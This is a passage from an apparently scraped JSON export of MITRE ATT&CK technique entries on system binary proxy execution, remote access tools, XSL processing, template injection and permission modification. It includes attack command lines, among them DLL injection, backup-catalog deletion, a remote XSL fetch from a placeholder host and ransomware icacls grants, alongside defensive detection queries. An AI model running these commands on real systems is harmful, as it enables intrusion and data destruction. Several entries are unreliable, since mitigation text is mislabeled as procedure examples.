      "Ragnar Lockerhas used rundll32.exe to execute components of VirtualBox.[97]",
      "Raspberry Robinuses rundll32 execution without any command line parameters to contact command and control infrastructure, such as IP addresses associated withTornodes.[98]",
      "RedCurlhas used rundll32.exe to execute malicious files.[99][100][101]",
      "RTMruns its core DLL file using rundll32.exe.[102][103]",
      "Sakulacalls cmd.exe to run various DLL files via rundll32.[104]",
      "Sandworm Teamused a backdoor which could execute a supplied DLL using rundll32.exe.[105]",
      "SDBbothas used rundll32.exe to execute DLLs.[52]",
      "ServHelpercontains a module for downloading and executing DLLs that leveragesrundll32.exe.[106]",
      "Sibothas executed downloaded DLLs withrundll32.exe.[107]",
      "During theSolarWinds Compromise,APT29usedRundll32.exeto execute payloads.[108][109]",
      "Squirrelwafflehas been executed usingrundll32.exe.[110][111]",
      "StreamExuses rundll32 to call an exported function.[112]",
      "StrelaStealerDLL payloads have been executed viarundll32.exe.[113][114]",
      "SUNBURSTused Rundll32 to execute payloads.[109]",
      "SVCReadyhas usedrundll32.exefor execution.[115]",
      "TA505has leveragedrundll32.exeto execute malicious DLLs.[116][106]",
      "TA551has used rundll32.exe to load malicious DLLs.[117]",
      "Troll Stealeris dropped as a DLL file and executed viarundll32.exeby its installer.[118][119]",
      "USBferrycan execute rundll32.exe in memory to avoid detection.[120]",
      "Water Curupira Pikabot Distributionutilizes rundll32.exe to execute the finalPikabotpayload, using the named exportsCrashorLimitdepending on the variant.[121]",
      "TheWinnti for Windowsinstaller loads a DLL using rundll32.[122][123]",
      "Wizard Spiderhas utilizedrundll32.exeto deploy ransomware commands with the use of WebDAV.[124]",
      "ZxShellhas used rundll32.exe to execute other DLLs and named pipes.[125]"
    ]
  },
  "T1218.012": {
    "Name": "System Binary Proxy Execution:Verclsid",
    "Description": "Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.[1]Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by runningverclsid.exe /S /C {CLSID}, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar toRegsvr32). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.[2][3][4][5]",
    "Detects": [
      "Command arguments used before and after the invocation of verclsid.exe may also be useful in determining the origin and purpose of the payload being executed.",
      "Use process monitoring to monitor the execution and arguments of verclsid.exe. Compare recent invocations of verclsid.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Depending on the environment, it may be unusual for verclsid.exe to have a parent process of a Microsoft Office product. It may also be unusual for verclsid.exe to have any child processes or to make network connections or file modifications."
    ],
    "Procedure Examples": [
      "Hancitorhas used verclsid.exe to download and execute a malicious script.[3]"
    ]
  },
  "T1218.013": {
    "Name": "System Binary Proxy Execution:Mavinject",
    "Description": "Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).[1]Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e.Dynamic-link Library Injection), allowing for arbitrary code execution (ex.C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL).[2][3]Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process.In addition toDynamic-link Library Injection, Mavinject.exe can also be abused to perform import descriptor injection via its/HMODULEcommand-line parameter (ex.mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.[4]",
    "Detects": [
      "Adversaries may rename abusable binaries to evade detections, but the argumentINJECTRUNNINGis required for mavinject.exe to performDynamic-link Library Injectionand may therefore be monitored to alert malicious activity.",
      "Monitor the execution and arguments of mavinject.exe. Compare recent invocations of mavinject.exe with prior history of known good arguments and injected DLLs to determine anomalous and potentially adversarial activity."
    ],
    "Procedure Examples": [
      "Consider removing mavinject.exe if Microsoft App-V is not used within a given environment.",
      "Use application control configured to block execution of mavinject.exe if it is not required for a given system or network to prevent potential misuse by adversaries."
    ]
  },
  "T1218.014": {
    "Name": "System Binary Proxy Execution:MMC",
    "Description": "Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.[1][2]MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.[3]For example,mmc C:\\Users\\foo\\admintools.msc /awill open a custom, saved console msc file in author mode.[1]Another common example ismmc gpedit.msc, which will open the Group Policy Editor application window.Adversaries may use MMC commands to perform malicious tasks. For example,mmc wbadmin.msc delete catalog -quietdeletes the backup catalog on the system (i.e.Inhibit System Recovery) without prompts to the user (Note:wbadmin.mscmay only be present by default on Windows Server operating systems).[4][5]Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies aComponent Object Modelclass object.[6]Then, adversaries may create custom consoles with the \"Link to Web Address\" snap-in that is linked to the malicious CLSID subkey.[7]Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command:mmc.exe -Embedding C:\\path\\to\\test.msc.[8]",
    "Detects": [
      "Monitor executed commands and arguments that may gather information about the victim's DNS that can be used during targeting.",
      "Monitor for creation and use of .msc files. MMC may legitimately be used to call Microsoft-created .msc files, such asservices.mscoreventvwr.msc. Invoking non-Microsoft .msc files may be an indicator of malicious activity.",
      "Monitor processes for suspicious or malicious use of MMC. Since MMC is a signed Windows binary, verify use of MMC is legitimate and not malicious."
    ],
    "Procedure Examples": [
      "Mustang Pandaused Microsoft Management Console Snap-In Control files, or MSC files, executed via MMC to run follow-on PowerShell commands duringRedDelta Modified PlugX Infection Chain Operations.[9]"
    ]
  },
  "T1218.015": {
    "Name": "System Binary Proxy Execution:Electron Applications",
    "Description": "Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams.[1]Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS.[2]The Chromium engine is used to display web content and Node.js runs the backend code.[3]Due to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework.[3]For example, the abuse ofteams.exeandchrome.exemay allow adversaries to execute malicious commands as child processes of the legitimate application (e.g.,chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe).[4]Adversaries may also execute malicious content by planting maliciousJavaScriptwithin Electron applications.[5]",
    "Detects": [
      "Monitor executed commands and arguments that may abuse Electron apps to execute malicious content. For example, analyze commands invokingteams.exeorchrome.exeto execute malicious or abnormal content.",
      "Monitor processes and command-line parameters for binaries associated with Electron apps that may be used to proxy execution of malicious content. Compare recent invocations of these binaries with prior history of known good arguments to determine anomalous and potentially adversarial activity.Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators."
    ],
    "Procedure Examples": [
      "Lumma Stealeras leveraged Electron Applications to disable GPU sandboxing to avoid detection by security software.[6]"
    ]
  },
  "T1219": {
    "Name": "Remote Access Tools",
    "Description": "An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.[1][2][3]Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.Remote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.Installation of many remote access tools may also include persistence (e.g., the software's installation routine creates aWindows Service). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).[4][5]",
    "Detects": [
      "Monitor for newly constructed drives or other related events associated with computer hardware and other accessories (especially new or unknown) being connected to systems. Endpoint sensors may be able to detect the addition of hardware via USB and other external device communication ports.",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g. extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Monitor for applications and processes related to remote admin software. Correlate activity with other suspicious behavior that may reduce false positives if this type of software is used by legitimate users and administrators.Domain Frontingmay be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote software to compromised systems. It may be possible to detect or prevent the installation of this type of software with host-based solutions."
    ],
    "Procedure Examples": [
      "Akirauses legitimate utilities such as AnyDesk and PuTTy for maintaining remote access to victim environments.[6][7]",
      "BlackBytehas used tools such as AnyDesk in victim environments.[8][9]",
      "DuringC0027,Scattered Spiderdirected victims to run remote monitoring and management (RMM) tools.[10]",
      "Carbanakhas a plugin for VNC and Ammyy Admin Tool.[11]",
      "Carbanakused legitimate programs such as AmmyyAdmin and Team Viewer for remote interactive C2 to target systems.[12]",
      "Cobalt Groupused the Ammyy Admin tool as well as TeamViewer for remote access, including to preserve remote access if a Cobalt Strike module was lost.[13][14][15]",
      "DarkVishnyaused DameWare Mini Remote Control for lateral movement.[16]",
      "Dridexcontains a module for VNC.[17]",
      "Egregorhas checked for the LogMein event log in an attempt to encrypt files in remote machines.[18]",
      "FIN7has utilized the remote management tool Atera to download malware to a compromised system.[19]",
      "GOLD SOUTHFIELDhas used the cloud-based remote management and monitoring tool \"ConnectWise Control\" to deployREvil.[20]",
      "Hildegardhas established tmate sessions for C2 communications.[21]",
      "INC Ransomhas used AnyDesk and PuTTY on compromised systems.[22][23][24][25]",
      "MuddyWaterhas used legitimate applications ScreenConnect, AteraAgent and SimpleHelp to manage systems remotely and move laterally.[26][27][28][29]",
      "DuringNight Dragon, threat actors used several remote administration tools as persistent infiltration channels.[30]",
      "OilRighas incorporated remote monitoring and management (RMM) tools into their operations includingngrok.[31]",
      "RTMhas the capability to download a VNC module from command and control (C2).[32]",
      "Sandworm Teamhas used remote administration tools or remote industrial control system client software for execution and to maliciously release electricity breakers.[33][34]",
      "DuringC0027,Scattered Spiderdirected victims to run remote monitoring and management (RMM) tools.[10]In addition to directing victims to run remote software, Scattered Spider members themselves also deploy RMM software including AnyDesk, LogMeIn, and ConnectWise Control to establish persistence on the compromised network.[35][36]",
      "TeamTNThas established tmate sessions for C2 communications.[21][37]",
      "TrickBotuses vncDll module to remote control the victim machine.[38][39]"
    ]
  },
  "T1219.001": {
    "Name": "Remote Access Tools:IDE Tunneling",
    "Description": "Adversaries may abuse Integrated Development Environment (IDE) software with remote development features to establish an interactive command and control channel on target systems within a network. IDE tunneling combines SSH, port forwarding, file sharing, and debugging into a single secure connection, letting developers work on remote systems as if they were local. Unlike SSH and port forwarding, IDE tunneling encapsulates an entire session and may use proprietary tunneling protocols alongside SSH, allowing adversaries to blend in with legitimate development workflows. Some IDEs, like Visual Studio Code, also provide CLI tools (e.g.,code tunnel) that adversaries may use to programmatically establish tunnels and generate web-accessible URLs for remote access. These tunnels can be authenticated through accounts such as GitHub, enabling the adversary to control the compromised system via a legitimate developer portal.[1][2][3]Additionally, adversaries may use IDE tunneling for persistence. Some IDEs, such as Visual Studio Code and JetBrains, support automatic reconnection. Adversaries may configure the IDE to auto-launch at startup, re-establishing the tunnel upon execution. Compromised developer machines may also be exploited as jump hosts to move further into the network.IDE tunneling tools may be built-in or installed asIDE Extensions.",
    "Detects": [
      "Monitor for the creation of the filecode_tunnel.jsonwithin the.vscode-clidirectory in a user's home profile (~/.vscode-cli/code_tunnel.jsonon Linux/macOS or%UserProfile%\\.vscode-cli\\code_tunnel.jsonon Windows), which signals a Visual Studio Code tunnel has been established.[3]Analytic 1 - Monitor for active or persistent VS Code Tunnelsourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=11(file_path=\"\\.vscode-cli\\code_tunnel.json\" OR file_path=\"/.vscode-cli/code_tunnel.json\")| stats min(_time) as creation_time by host, user, file_path| sort creation_time",
      "Network traffic directed to*.tunnels.api.visualstudio.comor*.devtunnels.msindicate that a system is attempting to initiate or maintain a Visual Studio Code remote tunnel.[6]Analytic 1 - Detect active IDE tunnel to VSCode or JetBrains cloud relaysourcetype=\"stream:http\" OR sourcetype=\"stream:tcp\"(dest_domain=\".tunnels.api.visualstudio.com\" OR dest_domain=\".devtunnels.ms\")| stats count by _time, src_ip, dest_ip, dest_domain, uri_path| sort _time desc",
      "On Windows, monitor for executions ofcode.exewith arguments such astunnel,--remote, or--host. On macOS, monitor processes likecodeorjetbrains-gatewaylaunched with similar remote access flags. On Linux, track the execution of code,jetbrains-gateway, orsshwith tunneling options like-R,-L, or-D. These process-creation events can indicate attempts to establish remote tunnels through IDEs.Analytic 1 - Detect interactive remote access session initiated by IDEsourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1(Image=\"\\code.exe\" OR Image=\"/code\" OR Image=\"/jetbrains-gateway\" OR Image=\"/ssh\")(CommandLine=\"tunnel\" OR CommandLine=\"--remote\" OR CommandLine=\"-R\" OR CommandLine=\"-L\" OR CommandLine=\"-D*\")| table _time, host, user, Image, CommandLine, ParentImage| sort _time desc"
    ],
    "Procedure Examples": [
      "Use Group Policies to require user authentication by disabling anonymous tunnel access, preventing any unauthenticated tunnel creation or usage. Disable the Visual Studio Dev Tunnels feature to block tunnel-related commands, allowing only minimal exceptions for utility functions (unset, echo, ping, and user). Restrict tunnel access to approved Microsoft Entra tenant IDs by specifying allowed tenants; all other users are denied access by default.[4][5]"
    ]
  },
  "T1219.002": {
    "Name": "Remote Access Tools:Remote Desktop Software",
    "Description": "An adversary may use legitimate desktop support software to establish an interactive command and control channel to target systems within networks. Desktop support software provides a graphical interface for remotely controlling another computer, transmitting the display output, keyboard input, and mouse control between devices using various protocols. Desktop support software, such asVNC,Team Viewer,AnyDesk,ScreenConnect,LogMein,AmmyyAdmin, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.[1][2][3]Remote access modules/features may also exist as part of otherwise existing software such as Zoom or Google Chrome’s Remote Desktop.[4][5]",
    "Detects": [
      "Monitor for Outbound connections to known RMM service endpoints (e.g.,.teamviewer.com,.anydesk.com)New connections from internal systems to unexpected IPs on:TCP 5938 (TeamViewer)TCP 7070–7071 (AnyDesk)TCP 5650 (Ammyy Admin)TCP/UDP 443, 80, or randomized portsAnalytic 1 - Detect network traffic for Remote Desktop softwaresourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=3(DestinationHostname IN (\".teamviewer.com\", \".anydesk.com\", \".logmein.com\", \".screenconnect.com\"))OR (DestinationPort IN (5938, 7070, 7071, 443) AND Image=\"*\")| stats count by Image, DestinationIp, DestinationPort, CommandLine, host, _time| sort -_time",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g. extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor for applications and processes related to remote desktop software. Correlate activity with other suspicious behavior that may reduce false positives if this type of software is used by legitimate users and administrators.Domain Frontingmay be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote software to compromised systems. It may be possible to detect or prevent the installation of this type of software with host-based solutions.Analytic 1 - Detect Remote Desktop Executionsourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational(Image=\"\\TeamViewer.exe\" OR Image=\"\\AnyDesk.exe\" OR Image=\"\\Ammyy_Admin.exe\" OR Image=\"\\connectwisecontrol.client.exe\")| stats count by Image, ParentImage, CommandLine, user, host, _time| sort -_time"
    ],
    "Procedure Examples": [
      "DuringC0015, the threat actors installed the AnyDesk remote desktop application onto the compromised network.[6]",
      "DuringC0018, the threat actors used AnyDesk to transfer tools between systems.[7][8]",
      "EVILNUMhas used the malware variant, TerraTV, to run a legitimate TeamViewer application to connect to compromised machines.[9]",
      "Kimsukyhas used a modified TeamViewer client as a command and control channel.[10][11]",
      "Mustang Pandahas installed TeamViewer on targeted systems.[12]",
      "RTMhas used a modified version of TeamViewer and Remote Utilities for remote access.[13]",
      "Storm-1811has abused multiple types of legitimate remote access software and tools, such as ScreenConnect, NetSupport Manager, and AnyDesk.[14][15]",
      "Thripused a cloud-based remote access software called LogMeIn for their attacks.[16]"
    ]
  },
  "T1219.003": {
    "Name": "Remote Access Tools:Remote Access Hardware",
    "Description": "An adversary may use legitimate remote access hardware to establish an interactive command and control channel to target systems within networks. These services, including IP-based keyboard, video, or mouse (KVM) devices such as TinyPilot and PiKVM, are commonly used as legitimate tools and may be allowed by peripheral device policies within a target environment.Remote access hardware may be physically installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote session with the target system. Using hardware-based remote access tools may allow threat actors to bypass software security solutions and gain more control over the compromised device(s).[1][2]",
    "Detects": [
      "Monitor for newly constructed drives or other related events associated with computer hardware and other accessories (especially new or unknown) being connected to systems. Endpoint sensors may be able to detect the addition of hardware via USB and other external device communication ports. For example, by default TinyPilot declares its manufacturer name astinypilotand its serial number as6b65796d696d6570690within the/opt/tinypilot-privileged/init-usb-gadgetdirectory. It also announces itself asTinyPilotwithin its EDID (Extended Display Identification Data).[3]Analytic 1 - USB Device Enumeration(sourcetype=\"WinEventLog:Microsoft-Windows-DriverFrameworks-UserMode/Operational\" OR sourcetype=\"syslog\")(EventCode=2003 OR EventCode=2100 OR message=\"tinypilot\" OR message=\"TinyPilot\")| eval timestamp=_time| table timestamp, host, user, DeviceClass, FriendlyName, VendorID, ProductID, SerialNumber| sort by timestamp desc"
    ],
    "Procedure Examples": [
      "Block the use of IP-based KVM devices within the network if they are not required."
    ]
  },
  "T1220": {
    "Name": "XSL Script Processing",
    "Description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.[1]Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar toTrusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe)[2]can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.[3]Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.[4]Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.[5]Command-line examples:[3][5]msxsl.exe customers[.]xml script[.]xslmsxsl.exe script[.]xsl script[.]xslmsxsl.exe script[.]jpeg script[.]jpegAnother variation of this technique, dubbed \"Squiblytwo\", involves usingWindows Management Instrumentationto invoke JScript or VBScript within an XSL file.[6]This technique can also execute local/remote scripts and, similar to itsRegsvr32/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias inWindows Management Instrumentationprovided they utilize the /FORMAT switch.[5]Command-line examples:[5][6]Local File:wmic process list /FORMAT:evil[.]xslRemote File:wmic os get /FORMAT:\"https[:]//example[.]com/evil[.]xsl\"",
    "Detects": [
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.",
      "Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe.[6][11]Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded. The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious."
    ],
    "Procedure Examples": [
      "Astarothexecutes embedded JScript or VBScript in an XSL stylesheet located on a remote domain.[7]",
      "Cobalt Groupused msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.[8]",
      "Higaisaused an XSL file to run VBScript code.[9]",
      "DuringOperation Dream Job,Lazarus Groupused a remote XSL script to download a Base64-encoded DLL custom downloader.[10]"
    ]
  },
  "T1221": {
    "Name": "Template Injection",
    "Description": "Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.[1]Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.[2]These documents can be delivered via other techniques such asPhishingand/orTaint Shared Contentand may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.[3]Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.[4]Adversaries may also modify the*\\templatecontrol word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.[5][6]This technique may also enableForced Authenticationby injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.[7][8][9]",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Analyze process behavior to determine if an Office application is performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex:PowerShell), or other suspicious actions that could relate to post-compromise behavior."
    ],
    "Procedure Examples": [
      "APT28used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro.[10]",
      "Chaeschanged the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload.[11]",
      "Confuciushas used a weaponized Microsoft Word document with an embedded RTF exploit.[12]",
      "DarkHydrusused an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enableForced Authentication.[13]",
      "Dragonflyhas injected SMB URLs into malicious Word spearphishing attachments to initiateForced Authentication.[14]",
      "DuringFrankenstein, the threat actors used trojanized documents that retrieved remote templates from an adversary-controlled website.[15]",
      "Gamaredon Grouphas used DOCX files to download malicious DOT document templates and has used RTF template injection to download malicious payloads.[5]Gamaredon Groupcan also inject malicious macros or remote templates into documents already present on compromised systems.[16][17][18][19][20][21]",
      "Inceptionhas used decoy documents to load malicious remote payloads via HTTP.[22]",
      "DuringOperation Dream Job,Lazarus Groupused DOCX files to retrieve a malicious document template/DOTM file.[23][24]",
      "Tropic Trooperdelivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE (XLS) document.[25]",
      "WarzoneRAThas been install via template injection through a malicious DLL embedded within a template RTF in a Word document.[12]"
    ]
  },
  "T1222": {
    "Name": "File and Directory Permissions Modification",
    "Description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.[1][2]File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence viaAccessibility Features,Boot or Logon Initialization Scripts,Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files viaHijack Execution Flow.Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.[3][4][5][6][7]",
    "Detects": [
      "Monitor for changes made to ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.",
      "Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.",
      "Monitor and investigate attempts to modify ACLs and file/directory ownership.",
      "Monitor for newly executed processes that may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.[1][2]"
    ],
    "Procedure Examples": [
      "Ensure critical system files as well as those known to be abused by adversaries have restrictive permissions and are owned by an appropriately privileged account, especially if access is not required by users nor will inhibit system functionality.",
      "Applying more restrictive permissions to files and directories could prevent adversaries from modifying their access control lists. Additionally, ensure that user settings regarding local and remote symbolic links are properly set or disabled where unneeded.[8]"
    ]
  },
  "T1222.001": {
    "Name": "File and Directory Permissions Modification:Windows File and Directory Permissions Modification",
    "Description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.[1][2]File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).[3]Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.[4]Adversaries can interact with the DACLs using built-in Windows commands, such asicacls,cacls,takeown, andattrib, which can grant adversaries higher permissions on specific files and folders. Further,PowerShellprovides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence viaAccessibility Features,Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files viaHijack Execution Flow.",
    "Detects": [
      "Monitor for changes made to DACLs and file/directory ownership. Many of the commands used to modify DACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.",
      "Monitor for executed commands and arguments for PowerShell cmdlets that can be used to retrieve or modify file and directory DACLs.",
      "Consider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.Adversaries sometimes modify object access rights at the operating system level. There are varying motivations behind this action - they may not want some files/objects to be changed on systems for persistence reasons and therefore provide admin only rights; also, they may want files to be accessible with lower levels of permissions.Windows environment logs can be noisy, so we take the following into consideration:We need to exclude events generated by the local system (subject security ID \"NT AUTHORITY\\SYSTEM\") and focus on actual user events.When a permission modification is made for a folder, a new event log is generated for each subfolder and file under that folder. It is advised to group logs based on handle ID or user ID.The Windows security log (event ID 4670) also includes information about the process that modifies the file permissions. It is advised to focus on uncommon process names, and it is also uncommon for real-users to perform this task without a GUI.Pseudocode Event ID is for Windows Security Log (Event ID 4670 - Permissions on an object were changed).Windows Event ID 4719 (An Attempt Was Made to Access An Object) can also be used to alert on changes to Active Directory audit policy for a system.Analytic 1 - Access Permission Modification for Windows(source=\"*WinEventLog:Security\" EventCode IN (4670, 4719)) Object_Type=\"File\" Security_ID!=\"NT AUTHORITY\\SYSTEM\"",
      "Monitor for newly constructed processes and/or command-lines that can interact with the DACLs using built-in Windows commands, such as icacls, cacls, takeown, and attrib, which can grant adversaries higher permissions on specific files and folders."
    ],
    "Procedure Examples": [
      "BitPaymercan useicacls /resetandtakeown /Fto reset a targeted executable's permissions and then take ownership.[5]",
      "BlackByte Ransomwareuses themountvol.execommand to mount volume names and leverages the Microsoft Discretionary Access Control List tool,icacls.exe, to grant the group to \"Everyone\" full access to the root of the drive.[6]",
      "BlackCatcan use Windows commands such asfsutil behavior set SymLinkEvaluation R2L:1to redirect file system access to a different location after gaining access into compromised networks.[7]",
      "CaddyWipercan modify ACL entries to take ownership of files.[8]",
      "Grandoreirocan modify the binary ACL to prevent security tools from running.[9]",
      "JPINcan use the command-line utility cacls.exe to change file permissions.[10]",
      "Ryukcan launchicacls/grant Everyone:F /T /C /Qto delete every access-based restrictions on files and directories.[11]",
      "Storm-1811has usedcacls.exevia batch script to modify file and directory permissions in victim environments.[12]",
      "WannaCryusesattrib +handicacls . /grant Everyone:F /T /C /Qto make some of its files hidden and grant all users full access controls.[13]",
      "WastedLockerhas a command to take ownership of a file and reset the ACL permissions using thetakeown.exe /F filepathcommand.[14]",
      "Wizard Spiderhas used the icacls command to modify access control to backup servers, providing them with full control of all the system folders.[15]"
    ]
  },
  "T1222.002": {
    "Name": "File and Directory Permissions Modification:Linux and Mac File and Directory Permissions Modification",
